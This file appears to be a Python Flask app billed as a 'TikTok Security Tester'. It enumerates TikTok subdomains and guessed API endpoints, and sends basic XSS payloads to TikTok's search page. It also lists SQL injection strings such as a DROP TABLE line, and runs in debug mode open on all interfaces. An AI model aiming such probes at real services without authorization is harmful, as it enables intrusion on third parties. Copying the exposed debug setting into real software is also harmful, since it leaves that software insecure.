from flask import Flask, render_template, request, jsonify, session
import requests
import json
import time
import threading
from urllib.parse import urljoin, urlparse
import ssl
import socket
from concurrent.futures import ThreadPoolExecutor
import uuid
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)

class TikTokSecurityTester:
    def __init__(self):
        self.session = requests.Session()
        self.setup_session()
        self.vulnerabilities = []
        
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })

class TikTokRecon:
    def __init__(self, tester):
        self.tester = tester
        
    def enumerate_subdomains(self, target_domain="tiktok.com"):
        results = []
        common_subdomains = [
            "api", "www", "m", "mobile", "app", "admin", "dev", "test", "staging",
            "beta", "alpha", "api-v1", "api-v2", "cdn", "static", "assets",
            "upload", "download", "stream", "live", "creator", "business",
            "ads", "analytics", "metrics", "log", "logs", "monitor"
        ]
        
        def check_subdomain(sub):
            url = f"https://{sub}.{target_domain}"
            try:
                response = self.tester.session.get(url, timeout=5)
                if response.status_code != 404:
                    return {
                        'url': url,
                        'status': response.status_code,
                        'title': 'Active Subdomain Found'
                    }
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            found_subs = list(filter(None, executor.map(check_subdomain, common_subdomains)))
        
        return found_subs

class TikTokAPITester:
    def __init__(self, tester):
        self.tester = tester
        
    def discover_api_endpoints(self):
        results = []
        common_endpoints = [
            "/api/v1/users",
            "/api/v2/videos",
            "/api/post/item_list/",
            "/api/user/detail/",
            "/api/challenge/detail/",
            "/api/search/general/",
            "/api/recommend/item_list/",
            "/aweme/v1/feed/",
            "/aweme/v1/user/",
            "/aweme/v1/comment/list/",
            "/share/user/",
            "/share/video/",
            "/node/share/user",
            "/api/img/",
            "/api/live/",
            "/webcast/room/",
        ]
        
        base_urls = ["https://www.tiktok.com", "https://m.tiktok.com"]
        
        for base_url in base_urls:
            for endpoint in common_endpoints[:8]:  # Limit for demo
                url = urljoin(base_url, endpoint)
                try:
                    response = self.tester.session.get(url, timeout=5)
                    if response.status_code in [200, 201, 202]:
                        results.append({
                            'url': url,
                            'status': response.status_code,
                            'title': 'Active API Endpoint',
                            'method': 'GET'
                        })
                    elif response.status_code == 401:
                        results.append({
                            'url': url,
                            'status': response.status_code,
                            'title': 'Authentication Required',
                            'method': 'GET'
                        })
                except:
                    pass
        
        return results

class TikTokWebTester:
    def __init__(self, tester):
        self.tester = tester
        
    def test_xss(self):
        results = []
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
        ]
        
        test_params = ['q', 'search', 'username']
        
        for payload in xss_payloads[:2]:
            for param in test_params[:2]:
                test_url = f"https://www.tiktok.com/search?{param}={payload}"
                try:
                    response = self.tester.session.get(test_url, timeout=5)
                    results.append({
                        'url': test_url,
                        'payload': payload,
                        'title': 'XSS Test Completed',
                        'reflected': payload in response.text
                    })
                except:
                    results.append({
                        'url': test_url,
                        'payload': payload,
                        'title': 'XSS Test Failed',
                        'reflected': False
                    })
        
        return results

    def test_sql_injection(self):
        results = []
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT null,null,null--",
        ]
        
        for payload in sql_payloads:
            results.append({
                'payload': payload,
                'title': 'SQL Injection Test',
                'description': f'Testing payload: {payload}',
                'status': 'tested'
            })
        
        return results

# Global storage for scan results
scan_results = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan', methods=['POST'])
def start_scan():
    data = request.json
    target = data.get('target', 'tiktok.com')
    scan_types = data.get('scanTypes', [])
    
    scan_id = str(uuid.uuid4())
    scan_results[scan_id] = {
        'status': 'running',
        'progress': 0,
        'results': [],
        'target': target,
        'start_time': time.time()
    }
    
    # Start scan in background thread
    thread = threading.Thread(target=perform_scan, args=(scan_id, target, scan_types))
    thread.daemon = True
    thread.start()
    
    return jsonify({'scan_id': scan_id, 'status': 'started'})

@app.route('/api/scan/<scan_id>/status')
def get_scan_status(scan_id):
    if scan_id not in scan_results:
        return jsonify({'error': 'Scan not found'}), 404
    
    return jsonify(scan_results[scan_id])

@app.route('/api/scan/<scan_id>/results')
def get_scan_results(scan_id):
    if scan_id not in scan_results:
        return jsonify({'error': 'Scan not found'}), 404
    
    return jsonify(scan_results[scan_id]['results'])

def perform_scan(scan_id, target, scan_types):
    tester = TikTokSecurityTester()
    all_results = []
    
    total_steps = len(scan_types)
    current_step = 0
    
    if 'recon' in scan_types:
        scan_results[scan_id]['progress'] = int((current_step / total_steps) * 100)
        recon = TikTokRecon(tester)
        recon_results = recon.enumerate_subdomains(target)
        all_results.extend([{**r, 'category': 'Reconnaissance'} for r in recon_results])
        current_step += 1
    
    if 'api' in scan_types:
        scan_results[scan_id]['progress'] = int((current_step / total_steps) * 100)
        api_tester = TikTokAPITester(tester)
        api_results = api_tester.discover_api_endpoints()
        all_results.extend([{**r, 'category': 'API Testing'} for r in api_results])
        current_step += 1
    
    if 'web' in scan_types:
        scan_results[scan_id]['progress'] = int((current_step / total_steps) * 100)
        web_tester = TikTokWebTester(tester)
        xss_results = web_tester.test_xss()
        sql_results = web_tester.test_sql_injection()
        all_results.extend([{**r, 'category': 'Web Security'} for r in xss_results + sql_results])
        current_step += 1
    
    scan_results[scan_id]['status'] = 'completed'
    scan_results[scan_id]['progress'] = 100
    scan_results[scan_id]['results'] = all_results
    scan_results[scan_id]['end_time'] = time.time()

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
